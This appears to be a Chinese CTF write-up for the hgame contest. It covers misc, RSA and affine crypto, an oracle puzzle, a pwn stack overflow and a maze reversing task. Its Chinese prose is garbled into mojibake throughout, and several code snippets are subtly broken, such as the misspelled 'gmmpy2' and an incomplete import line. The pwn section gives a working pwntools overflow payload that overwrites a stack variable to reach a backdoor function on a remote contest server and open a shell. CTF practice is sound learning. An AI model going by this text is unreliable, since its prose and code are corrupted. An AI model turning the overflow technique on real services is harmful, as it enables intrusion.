\nè§£å‹åå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œç”¨audacityæ‰“å¼€ï¼Œç›®æµ‹ä¸€ä¸‹æ³¢å½¢æ²¡ä»€ä¹ˆå¥‡æ€ªçš„åœ°æ–¹ï¼ˆè¿˜æŒºå¥½å¬\nå†çœ‹çœ‹é¢‘è°±å›¾å¾—åˆ°flag  \n## Crypto  \n### infantRSA  \nç»™å‡ºæ•°æ®å¦‚ä¸‹  \np = 681782737450022065655472455411;  \nq = 675274897132088253519831953441;  \ne = 13;  \nc=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841  \n![](24.png)\næ‰€ä»¥å·²çŸ¥pqecçš„è¯å…ˆæ±‚å‡ºdï¼Œå†æ±‚må°±å¥½  \n```python\nimport gmpy2\n\np=681782737450022065655472455411\nq=675274897132088253519831953441\ne=13\nc=275698465082361070145173688411496311542172902608559859019841\ns=(p-1)*(q-1)\nd=long(gmmpy2.invert(e,s))\nn=p*q\nm=pow(c,d,n)\nres=m.to_bytes(m.bit_length(),byteorder='big')\nprint(res)\n```\n### Affine\nè¿™é¢˜ç›´æ¥æ”¹äº†ç½‘ä¸Šçš„è„šæœ¬  \na.b.flagéƒ½æ˜¯æœªçŸ¥çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å¯†æ–‡å’Œæ˜æ–‡ä¸­çš„hgameï¼Œäºæ˜¯å…ˆæ±‚aå’Œb\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\n\npre=[12,11,7,6,18]\npost=[46,33,43,30,0]\nfor a in range(MOD):\n\tif GCD(a,MOD)!=1:\n\t\tcontinue\n\tinv_a=inverse(a,MOD)\n\tfor b in range(MOD):\n\t\tq=1\n\t\tfor i in range(5):\n\t\t\tif(inv_a*(post[i]-b))%MOD!=pre[i]:\n\t\t\t\tq=0\n\t\t\t\tbreak\n\t\tif(q):\n\t\t\tprint(a,b)\n\t\t\t#13,14\n```\nabæ±‚å‡ºåå¯ä»¥æ±‚å¾—å®Œæ•´çš„æ˜æ–‡\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\na=13\nb=14\ninv_a=inverse(a,MOD)\ncipher='A8I5z{xr1A_J7ha_vG_TpH410}'\nflag=''\nfor p in cipher:\n\ti=TABLE.find(p)\n\tif i==-1:\n\t\tflag+=p\n\telse:\n\t\tii=(inv_a*(i-b))%MOD\n\t\tflag+=TABLE[ii]\nprint(flag)\n```\n### Reorder\nè¿™é¢˜ä¸€å¼€å§‹æ˜¯çœŸçš„æ‡µæ¯”â€¦..åæ¥é—®äº†ä¸€ä¸‹lurk  \nå‘ç°è¾“å…¥æŸä¸ªå­—ç¬¦åï¼Œè¿”å›åçš„å­—ç¬¦æ‰€åœ¨ä½ç½®å°±æ˜¯æ‰€å¯¹åº”çš„å¯†æ–‡  \n![](00.png)\nè¾“å…¥  \n0  \n00  \n000  \n0000  \n00000  \nå‘ç°è¿”å›çš„ä½ç½®å’Œhgameç›¸å¯¹åº”ï¼Œä¹‹åä¸€ç›´æ·»åŠ è¾“å…¥æ•°é‡ï¼Œå†è§‚å¯Ÿæ¯æ¬¡æ–°å¢çš„ä½ç½®æ‰€å¯¹åº”çš„å­—ç¬¦å°±å¥½å•¦~  \n## PWN\n### Hard_AAAAA\næ„Ÿè°¢Cè€æ¿çš„è€å¿ƒè§£ç­”ï¼Œé¡ºä¾¿æŠŠå‘éƒ½è¸©äº†ä¸€éâ€¦.  \nä¸‹è½½ä¹‹åå…ˆä¾‹å¸¸checksecï¼ˆæ„Ÿè§‰ä¿æŠ¤å¼€æ²¡å¼€å…¶å®å½±å“ä¸æ˜¯å¾ˆå¤§â€¦..ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæˆ‘ä¸æ‡‚ï¼‰ \nIdaå¯åŠ¨ï¼f5ï¼  \n![](31.png)\n![](32.png)\nå¯ä»¥é€šè¿‡gets()ä½¿å¾—sæº¢å‡ºè¦†ç›–v5çš„å€¼ï¼Œä»è€Œæ»¡è¶³ifå†…çš„æ¡ä»¶ï¼Œæ‰§è¡Œbackdoor()å‡½æ•°  \nsä¸v5çš„ç›¸å¯¹è·ç¦»ä¸º0xAC-0x31,è¿™ä¸€æ®µç”¨éšä¾¿ä»€ä¹ˆæ•°æ®å¡«å……:â€™aâ€™ * (0xAC-0x31)  \nä¹‹åè¦æ»¡è¶³memcmpçš„æ¡ä»¶å³memcmp(â€œ0O0oâ€,&v5,7u)==0  \nåœ¨7ä¸ªå†…å­˜å•å…ƒå†…ï¼Œv5èƒ½å’Œâ€œ0O0oâ€ç›¸ç­‰ï¼ˆâ€¦.æ²¡æ³¨æ„åˆ°7â€¦ï¼‰  \nåŒå‡»memcmpä¸­çš„â€œ0O0oâ€ï¼Œè·³è½¬  \n![](33.png)\nå‘ç°å’Œâ€O0â€ç›¸é‚»ï¼Œå°±æ˜¯è¯´æ¯”è¾ƒå®Œâ€œ0O0oâ€åä¼šç»§ç»­æ¯”è¾ƒâ€œO0â€  \næ‰€ä»¥æ„é€ payload=â€™aâ€™ * (0xAC-0x31)+â€™ 0O0o\\00O0â€™(ä¹‹å‰è¿˜æ‰“æˆäº†â€™0O0o\\\\\\00O0â€™,æˆ‘æ˜¯çœŸçš„è ¢)  \n```python\nfrom pwn import *\np=remote(\"47.103.214.163\",\"20000\")\np.recvuntil(\"Let's 0O0o\\\\0O0!\")\npayload='a'*(0xAC-0x31)+'0O0o\\00O0'\np.sendline(payload)\np.interactive()\n```\nè¿ä¸Šåè¾“å…¥lsæŸ¥çœ‹ç›®å½•ï¼Œå‘ç°æœ‰ä¸ªflagï¼Œå†cat flagè¯»å–å†…å®¹å°±å¥½äº†  \n## Reverse\n### maze\nIdaå¯åŠ¨ï¼f5ï¼  \n![](39.png)\nçŒœæµ‹æ˜¯æ–¹å‘é”®ï¼Œé€‰ä¸­æ•°å­—æŒ‰Råå°±ä¼šå˜æˆdswa(å¸¸ç”¨æ–¹å‘é”®)  \n![](40.png)\n![](41.png)\nä»£ç ç»™å‡ºäº†è¿·å®«èŒƒå›´(ä¸Šä¸‹é™)ä»¥åŠv5è¦èµ°çš„è·¯çº¿(0ä¸Š)  \nå…ˆçœ‹çœ‹v5çš„è¡Œèµ°èŒƒå›´ï¼Œå³è¿·å®«åœ°å›¾ï¼Œç‚¹è¿›unk_602080 \n\n![](42.png)  \n\né•¿è¿™æ ·ï¼Œé€‰ä¸­unk_602080å’Œunk_    60247Cé—´çš„å†…å®¹æŒ‰aå¯ä»¥ç®€å•åˆå¹¶ä¸€ä¸‹ï¼Œæ ‡è®°å¥½å‡ºå£å’Œå…¥å£ä½ç½®  \né€šè¿‡ä»£ç åˆ†æï¼Œä¸Šä¸‹ç§»åŠ¨å¯¹åº”64ä¸ªstepï¼Œå·¦å³å¯¹åº”4ä¸ªï¼Œæ‰€ä»¥åˆ é™¤æ‰å¤šä½™çš„æ•°æ®ï¼ˆæˆ‘æ˜¯æ‰‹åŠ¨åˆ â€¦.ï¼‰  \n![](44.png)\nå…¶ä¸­ä¸Šè¾¹çš„(0æ˜¯å…¥å£ï¼Œæœ€åçš„(0æ˜¯å‡ºå£ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°èµ°å‡ºè¿·å®«çš„è·¯å¾„  \nè¡Œèµ°çš„æ–¹å‘é”®åŠ ä¸Šhgame{}å°±æ˜¯flag\n","tags":["vidar"]}]